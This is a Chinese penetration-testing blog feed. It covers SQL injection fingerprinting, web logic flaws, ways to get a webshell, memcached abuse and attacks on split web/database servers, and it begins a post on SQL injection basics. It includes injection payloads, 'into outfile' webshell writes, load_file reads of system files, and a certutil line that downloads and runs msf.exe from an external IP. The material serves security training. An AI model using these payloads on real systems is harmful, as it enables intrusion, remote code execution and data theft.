&#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; ， &#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">oracle:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br><span class="line">postgresql :id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;&#x3D;concat(&#39;a&#39;,&#39;b&#39;)</span><br></pre></td></tr></table></figure></li><li><p>特殊符号以及注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“&#x2F;*”是MySQL中的注释符，返回错误说明该注入点不是MySQL</span><br><span class="line">“--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。</span><br><span class="line">“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库</span><br></pre></td></tr></table></figure></li><li><p>根据返回的报错类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ORACLE</span><br><span class="line">ORA-01756:quoted string not properly terminated</span><br><span class="line">ORA-00933:SQLcommand not properly ended</span><br><span class="line">MS-SQL</span><br><span class="line">Msg 170,level 15, State 1,Line 1</span><br><span class="line">Line 1:Incorrect syntax near ‘foo</span><br><span class="line">Msg 105,level 15,state 1,Line 1</span><br><span class="line">Unclose quotation mark before the character string ‘foo</span><br><span class="line">MYSQL</span><br><span class="line">you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x</span><br></pre></td></tr></table></figure></li><li><p>各个数据库特有的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、mssql数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">2、access数据库</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">3、mysql数据库(mysql版本在5.0以上)</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</span><br><span class="line">4、oracle数据库</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>dirsearch、dirmap、dirb、御剑扫描工具。</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>namp、Masscan、msf</p><h5 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h5><ul><li><p>oneforall、知道创宇实验室ksubdomain</p></li><li><p>谷歌hacker语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure></li></ul><h5 id="判断网站CMS类型"><a href="#判断网站CMS类型" class="headerlink" title="判断网站CMS类型"></a>判断网站CMS类型</h5><ul><li><p>cms特有的文件路径</p><p>比如WordPress的常用路径为wp-admin等等。</p></li><li><p>robots.txt文件中会列出一些禁止爬的目录。</p></li><li><p>查看版权信息</p><ul><li>网页的最底部可能会有版权信息。</li><li>网页前台的源代码中可能会有注释的版权信息。</li></ul></li></ul><h5 id="常见的cms扫描工具"><a href="#常见的cms扫描工具" class="headerlink" title="常见的cms扫描工具"></a>常见的cms扫描工具</h5><p>WordPress的专用扫描工具，wpscan。</p><p>CMSmap可以扫描WordPress，Joomla和Drupal。</p><p>判断出CMS之后可以搜索以往的cms漏洞，或者找到源码审计一下。</p><h5 id="操作系统的判断"><a href="#操作系统的判断" class="headerlink" title="操作系统的判断"></a>操作系统的判断</h5><ul><li><p>nmap 参数-O表示扫描操作系统信息</p></li><li><p>ping命令 </p><p>TTL起始值:</p><p>Windows xp 128 (广域网中TTL为65-128)</p><p>Linux/Unix64(广域网中TTL为1-64)</p></li><li><p>大小写</p><p>Linux系统对大小写敏感</p><p>window系统对大小写不敏感</p></li></ul><h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><p>goby批量信息收集</p><p>w8fuckcdn 通过扫描全网绕过CDN获取网站IP地址</p><h4 id="网站CMS"><a href="#网站CMS" class="headerlink" title="网站CMS"></a>网站CMS</h4><h5 id="owasp-top-10漏洞挖掘"><a href="#owasp-top-10漏洞挖掘" class="headerlink" title="owasp top 10漏洞挖掘"></a>owasp top 10漏洞挖掘</h5><ul><li><p>sql注入漏洞</p></li><li><p>逻辑漏洞</p><p>支付漏洞</p><ul><li><p>任意金额修改</p><p>利用：抓包直接修改金额，可减少支付金额，也可修改为负的金额。</p><p>防御：</p><p>1、将商品ID和订单金额进行哈希加密，当用户修改金额之后再一次进行哈希加密并与原本的哈希值进行比较。</p><p>2、敏感参数不要放在url中。</p></li><li><p>请求重放</p><p>利用：</p><p>购买成功后，重放其中请求，竟然可以使购买商品一直增加。</p></li></ul><p>cookie缺陷</p><ul><li>token可以获取(前端爬虫)</li><li>cookie重复利用</li><li>cookie可枚举</li><li>cookie使用简单的加密算法</li></ul><p>验证码漏洞</p><ul><li><p>验证码绕过</p><p>原因：直接让验证码参数值为空，或者直接删掉验证码参数名，可导致绕过。</p></li><li><p>验证码回显</p><p>原因：验证码由前端即客户端生成，可在请求包中直接获取验证码。比如，前端源码、cookie中存在验证码。</p><p>利用：利用脚本提取验证码，直接暴力破解。</p><p>防御：</p><p>1、后端生成验证码。</p></li><li><p>验证码重复利用与验证码暴力破解</p></li><li><p>绕过防暴力破解</p><ul><li><p>限制IP</p><p>X-Forwarded-For绕过</p><p>在请求包中增加XFF报头即可，然后使用burp并将其也设置为一个intruder payload即可。</p></li><li><p>服务端只对失败次数进行了校验，当登录成功之后失败次数清0.</p><p>注册一个用户，将注册的用户(知道密码，成功登录之后会清零登录限制次数)与要暴力破解的用户放在一起。比如：正常用户steady，其他测试用户boy、sadjh、sadkh。可以生成一下字典：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br><span class="line">  steady</span><br><span class="line">  boy</span><br><span class="line">  boy</span><br><span class="line">  sadjh</span><br><span class="line">  steady</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>越权漏洞</p><ul><li>水平越权与垂直越权</li></ul><p>密码找回漏洞</p><ul><li><p>sql注入漏洞</p></li><li><p>某些字符标志可以组成url直接跳过验证</p></li><li><p>修改响应包</p><p>发送请求包，然后让响应包作为请求包，修改其中的敏感信息，然后再次发包。</p></li><li><p>跳过验证步骤(常见参数step)</p><ul><li>修改某些参数，可跳过认证步骤。</li></ul></li><li><p>替换用户账号或用户表示(uid、手机号、账号)</p><ul><li>两个账户测试，先使用一个账户B找回，然后把账号修改为A，最终成功修改A的账号。也可以直接复制数据包，只修改某些用户表示。</li></ul></li><li><p>删除某些参数可直接绕过验证</p></li><li><p>用户凭证在返回包中</p><ul><li>用户发送请求包，可以直接看到token信息、验证码</li></ul></li></ul></li></ul><h5 id="常见GetShell方式"><a href="#常见GetShell方式" class="headerlink" title="常见GetShell方式"></a>常见GetShell方式</h5><h6 id="owasp-top-10漏洞拿shell"><a href="#owasp-top-10漏洞拿shell" class="headerlink" title="owasp top 10漏洞拿shell"></a>owasp top 10漏洞拿shell</h6><ul><li><p>sql注入拿shell</p><ul><li><p>sqlmap –os-shell</p></li><li><p>sql注入漏洞直接写入shell</p><p>联合注入、报错注入、堆叠注入</p></li><li><p>日志文件拿shell(可以配合堆叠注入)</p></li><li><p>sqlmap –sql-shell 能够执行sql语句之后，在写shell</p></li></ul></li><li><p>phpadmin拿shell</p><ul><li>日志文件拿shell</li><li>直接执行sql语句那shell</li></ul></li><li><p>命令执行拿shell</p><ul><li>直接写shell到目标文件夹下面</li><li>执行系统命令、调用脚本语言反弹shell</li></ul></li><li><p>文件上传拿shell</p><ul><li>直接上传shell文件</li><li>上传一个具有写shell功能的文件，访问文件直接写入shell</li><li>上传一个具有命令执行的文件，然后执行命令写shell</li></ul></li><li><p>文件包含漏洞拿shell</p><ul><li>远程包含文件，将shell写入站点。</li><li>包含session文件</li><li>phpinfo本地包含临时文件</li></ul></li></ul><h6 id="网站功能点上传shell"><a href="#网站功能点上传shell" class="headerlink" title="网站功能点上传shell"></a>网站功能点上传shell</h6><ul><li><p>后台上传插件拿shell</p></li><li><p>后台数据库备份拿shell</p><p>数据库备份拿shell就是把我们sql语句放入数据库备份文件中,然后上传到服务器,服务器执行sql数据库备份文件进而执行我们的sql语句 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;一句话&quot; into outfile “路径”</span><br></pre></td></tr></table></figure><p>这里的路径一定要是全路径,不能只是一个文件名,如果只写相对路径或者文件名,文件会存储到服务器中的mysql所在的文件夹中</p></li><li><p>后台编辑前台模版文件拿shell</p></li><li><p>其他漏洞挖掘方式</p><ul><li><code>www.xxx.com\www.xxx.com.zip|rar</code>直接拖源码</li></ul></li></ul><h5 id="常见端口利用"><a href="#常见端口利用" class="headerlink" title="常见端口利用"></a>常见端口利用</h5><h6 id="11211端口–memcache"><a href="#11211端口–memcache" class="headerlink" title="11211端口–memcache"></a>11211端口–memcache</h6><p>漏洞介绍</p><p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p><p>漏洞利用</p><p>telnet直接连接目标端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet xx.xx.xx.xx 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ telnet ip 11211</span><br><span class="line">Trying ip...</span><br><span class="line">Connected to ip.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure><p>nmap扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -p 端口 --script memcached-info IP</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-11-16 17:56 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip</span><br><span class="line">Host is up (<span class="number">0.54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line"><span class="number">11211</span>/tcp open  memcached Memcached <span class="number">1.4</span><span class="number">.13</span> (uptime <span class="number">27164261</span> seconds)</span><br><span class="line">| memcached-info:</span><br><span class="line">|   Process ID: <span class="number">1121</span></span><br><span class="line">|   Uptime: <span class="number">27164262</span> seconds</span><br><span class="line">|   Server time: <span class="number">2020</span><span class="number">-11</span><span class="number">-16</span>T09:<span class="number">43</span>:<span class="number">25</span></span><br><span class="line">|   Architecture: <span class="number">64</span> bit</span><br><span class="line">|   Used CPU (user): <span class="number">1792.059996</span></span><br><span class="line">|   Used CPU (system): <span class="number">2583.961487</span></span><br><span class="line">|   Current connections: <span class="number">7</span></span><br><span class="line">|   Total connections: <span class="number">8070135</span></span><br><span class="line">|   Maximum connections: <span class="number">1024</span></span><br><span class="line">|   TCP Port: <span class="number">11211</span></span><br><span class="line">|   UDP Port: <span class="number">0</span></span><br><span class="line">|_  Authentication: no</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.20</span> seconds</span><br></pre></td></tr></table></figure><p>常用指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats &#x2F;&#x2F;查看memcache 服务状态 </span><br><span class="line">stats items &#x2F;&#x2F;查看所有items </span><br><span class="line">stats cachedump 32 0 &#x2F;&#x2F;获得缓存key </span><br><span class="line">get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="从web入口"><a href="#从web入口" class="headerlink" title="从web入口"></a>从web入口</h5><p>通过web入口可以通过web漏洞getshell，getshell之后获取数据库配置文件、对数据库内容进行分析，主要找到数据库ip。</p><h5 id="从数据库入口渗透"><a href="#从数据库入口渗透" class="headerlink" title="从数据库入口渗透"></a>从数据库入口渗透</h5><p>获取数据库账号、密码</p><p>在mysql中可以查看用户正在运行的线程，进而得到数据库ip地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.processlist</span><br></pre></td></tr></table></figure><p>在mssql中是否判断站酷分离</p><p>获取客户端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host_name();</span><br></pre></td></tr></table></figure><p>获取服务端主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@servername;</span><br></pre></td></tr></table></figure><p>如果客户端主机名和服务端主机名一直则是同站同数据库，如果不是则是站库分离。</p><h5 id="站库分离的判断方法"><a href="#站库分离的判断方法" class="headerlink" title="站库分离的判断方法"></a>站库分离的判断方法</h5><h6 id="查看网络连接状态"><a href="#查看网络连接状态" class="headerlink" title="查看网络连接状态"></a>查看网络连接状态</h6><p>通过Netstat命令查看MSSQL数据库1433端口的网络连接状态，可以看到与当前MSSQL数据库服务器192.168.32.8建立连接的只有192.168.32.3，由此可以判断这台主机为Web服务器，并且站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;1433&quot;</span><br></pre></td></tr></table></figure><h6 id="查看当前服务器的IP"><a href="#查看当前服务器的IP" class="headerlink" title="查看当前服务器的IP"></a>查看当前服务器的IP</h6><p>数据库配置文件</p><p>通过网站程序数据库配置文件来判断是否站库分离，如果数据库IP地址是localhost、127.0.0.1或当前主机内网IP则说明为同服务器，反之则可能为站库分离。</p><p>MySQL内置函数和库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@hostname;                                 &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;      &#x2F;&#x2F;客户端主机名称和端口</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201110222106564.png" alt="image-20201110222106564"></p><p>MSSQL注入语句</p><p>执行下面语句，如果页面正常回显，说明<code>host_name()=@@servername</code>即数据库服务端主机名称与数据库客户端主机名称一样，说明站库不分离。否则站库分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from news where 1&#x3D;(SELECT (case when host_name()&#x3D;@@servername then 1 else 0 end)))</span><br></pre></td></tr></table></figure><p>MSSQL内置函数和表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select host_name();                       &#x2F;&#x2F;客户端主机名称</span><br><span class="line">select @@servername;                      &#x2F;&#x2F;服务端主机名称</span><br><span class="line">select serverproperty(&#39;MachineName&#39;);     &#x2F;&#x2F;服务端主机名称</span><br></pre></td></tr></table></figure><p>其他配置文件</p><p>通过load_file()这个内置函数读取一些敏感文件，hosts文件、IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere的相关配置文件以及网卡信息等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP</span><br></pre></td></tr></table></figure><h5 id="站库分离利用思路"><a href="#站库分离利用思路" class="headerlink" title="站库分离利用思路"></a>站库分离利用思路</h5><p>下载远程木马文件</p><p>目标主机允许通外网时我们可以利用Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell等方式来下载远程文件到可读写目录中，然后再去执行一下即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;155.**.***.229:8888&#x2F;msf.exe C:\ProgramData\msf.exe</span><br><span class="line">C:\ProgramData\msf.exe</span><br></pre></td></tr></table></figure><p>使用metasploit模块</p><p>在数据库服务器中，没有web服务我们无法上传webshell，比如上传php、jsp、aspx等文件到目标服务器，执行webshell进而拿到shell。这时候我们可以使用msf的模块，该模块监听一个端口，但是不是生成一个exe木马，或者是一个编程语言的webshell，而是利用对方主机能够执行命令的特点，来获取一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Metasploit下的exploit&#x2F;multi&#x2F;script&#x2F;web_delivery和exploit&#x2F;windows&#x2F;misc&#x2F;hta_server两个模块来执行远程Payload获取会话</span><br></pre></td></tr></table></figure><p>模拟令牌权限提升</p><p>通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌。</p><p>通过Windows身份验证，使用数据库连接工具，比如sqlcmd、SSMS和Navicat Premium等。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL--SQL注入漏洞</title>
      <link href="2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span 